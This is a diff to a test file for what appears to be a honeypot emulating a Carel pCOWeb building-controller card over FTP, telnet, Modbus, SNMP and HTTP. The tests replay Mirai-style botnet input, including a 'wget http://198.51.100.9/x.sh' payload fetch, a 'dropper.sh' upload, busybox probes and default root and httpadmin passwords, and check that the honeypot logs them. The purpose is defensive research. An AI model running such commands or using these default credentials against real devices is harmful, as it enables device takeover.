@@ -394,10 +394,14 @@ def test_pcoweb(workdir):
         proc.wait(timeout=5)
 
 
+def http_get_auth(path):
+    return raw_http(f"GET {path} HTTP/1.1\r\nHost: x\r\n".encode() + basic("httpadmin", "fhttpadmin") + b"\r\n")[3]
+
+
 def test_pcoweb_ftp_telnet(workdir):
     # Same MAC as above: the card's host name is pCOWeb plus the last three octets.
     proc, log_path = start("pcoweb", workdir, MAC_ADDRESS="00:0a:5c:c8:24:f9", FTP_PORT=FTP_PORT, TELNET_PORT=TELNET_PORT,
-                      MODBUS_PORT=MODBUS_PORT, SNMP_PORT=SNMP_PORT)
+                      MODBUS_PORT=MODBUS_PORT, SNMP_PORT=SNMP_PORT, PCOWEB_CLOCK="1970")
     host = "pCOWebc824f9"
     try:
         def talk(sock, text, until):
@@ -427,6 +431,8 @@ def test_pcoweb_ftp_telnet(workdir):
             assert talk(s, b"SYST\r\n", b"\r\n") == b"215 UNIX Type: L8\r\n"
             assert talk(s, b"CWD /usr/local/root/flash/http\r\n", b"\r\n") == b"250 CWD command successful.\r\n"
             assert talk(s, b"CWD /nonexistent\r\n", b"\r\n") == b"550 /nonexistent: No such file or directory.\r\n"
+            assert talk(s, b"PORT 10,0,0,1,4,1\r\n", b"\r\n") == b"200 PORT command successful.\r\n"
+            assert talk(s, b"PASV\r\n", b"\r\n").startswith(b"227 Entering Passive Mode (192,168,1,100,")
             assert talk(s, b"STOR dropper.sh\r\n", b"\r\n").startswith(b"425 ")  # no data channel behind it
             assert talk(s, b"QUIT\r\n", b"\r\n") == b"221 Goodbye.\r\n"
 
@@ -446,7 +452,18 @@ def test_pcoweb_ftp_telnet(workdir):
             assert b"MIRAI: applet not found" in talk(s, b"/bin/busybox MIRAI\r\n", b"$ ")
             assert b"wget: command not found" in talk(s, b"wget http://198.51.100.9/x.sh\r\n", b"$ ")
             assert b"bin" in talk(s, b"ls /\r\n", b"$ ")
+            assert b"MIRAI" in talk(s, b"echo -e '\\x4d\\x49\\x52\\x41\\x49'\r\n", b"$ ")  # \x escapes are decoded
+            assert b"/dev/mtdblock" in talk(s, b"cat /proc/mounts\r\n", b"$ ")
+            assert b"ARM" in talk(s, b"cat /proc/cpuinfo\r\n", b"$ ")
+            assert b"command not found" not in talk(s, b"sh\r\n", b"$ ")
+            assert b"No such file" not in talk(s, b"ls /proc\r\n", b"$ ")
+            time.sleep(32)  # past the 30 s cap for ordinary connections: a logged-in session must survive
+            assert b"uid=0(root)" in talk(s, b"id\r\n", b"$ ")
             s.sendall(b"exit\r\n")
+        with socket.create_connection(("127.0.0.1", TELNET_PORT), timeout=5) as s:  # bots end lines with a bare LF
+            talk(s, b"", b"login: ")
+            assert b"Password: " in talk(s, b"root\n", b"Password: ")
+            assert b"$ " in talk(s, b"froot\n", b"$ ")
         # Modbus TCP: holding register n is analog variable n in tenths of a unit; 10 is the writable setpoint.
         with socket.create_connection(("127.0.0.1", MODBUS_PORT), timeout=5) as s:
             r = modbus(s, 1, struct.pack(">BHH", 3, 10, 1))
@@ -455,6 +472,9 @@ def test_pcoweb_ftp_telnet(workdir):
             r = modbus(s, 3, struct.pack(">BHH", 3, 10, 1))
             assert struct.unpack(">h", r[2:4])[0] == -170
             assert modbus(s, 4, struct.pack(">BHH", 3, 500, 1)) == bytes([0x83, 0x02])  # no such variable
+            assert len(modbus(s, 5, struct.pack(">BHH", 3, 1, 20))) == 2 + 40       # a normal 20 register read works
+            assert modbus(s, 6, struct.pack(">BHH", 1, 1, 16))[0] == 1              # coils answer
+            assert modbus(s, 7, bytes([0x2B, 0x0E, 0x01, 0x00])) == bytes([0xAB, 0x01])  # no device id object
         # SNMP v1/v2c: the card answers "public" with its system group and ignores other communities.
         def ber(tag, body):
             n = len(body)
@@ -484,6 +504,12 @@ def test_pcoweb_ftp_telnet(workdir):
         assert b"pcoweb@carel.com" in ask(snmp("public", 0xA1, "1.3.6.1.2.1.1.3.0"))  # GETNEXT: uptime -> contact
         assert ask(snmp("wrong-community", 0xA0, "1.3.6.1.2.1.1.1.0")) is None
         assert ask(snmp("public", 0xA5, "1.3.6.1.2.1.1.1.0", version=1)) is None  # GETBULK is never answered
+        assert ask(snmp("carel", 0xA3, "1.3.6.1.2.1.1.5.0")) is None               # nor SET
+        reply = ask(snmp("public", 0xA0, "1.3.6.1.2.1.1.3.0"))
+        ticks = int.from_bytes(reply[reply.index(b"\x43") + 2:][:reply[reply.index(b"\x43") + 1]], "big")
+        assert 20 * 86400 * 100 < ticks < 130 * 86400 * 100, ticks  # a card with no clock: uptime is the 1970 date
+        page = http_get_auth("/config/pw_snmp.html")
+        assert b"pCO Gateway" in page and b"Italy" in page and b"&lt;pcoweb@carel.com&gt;" in page, page
         assert ask(b"\x30\x03garbage") is None
         log = events(log_path)
         snmp_events = [e for e in log if e["proto"] == "snmp"]
@@ -492,7 +518,8 @@ def test_pcoweb_ftp_telnet(workdir):
         assert any(e["proto"] == "modbus" and e["event"] == "write" and e["start"] == 10 for e in log)
         logins = [(e["proto"], e["username"], e["password"], e["granted"]) for e in log if e["event"] == "login_attempt" and e["proto"] != "http"]
         assert logins == [("ftp", "httpadmin", "wrong", False), ("ftp", "httpadmin", "fhttpadmin", True),
-                          ("telnet", "root", "wrongpass", False), ("telnet", "root", "froot", True)], logins
+                          ("telnet", "root", "wrongpass", False), ("telnet", "root", "froot", True),
+                          ("telnet", "root", "froot", True)], logins  # the last one logged in with bare LFs
         cmds = [e["cmd"] for e in log if e["event"] == "command"]
         assert "STOR" in cmds and "wget http://198.51.100.9/x.sh" in cmds, cmds
     finally:
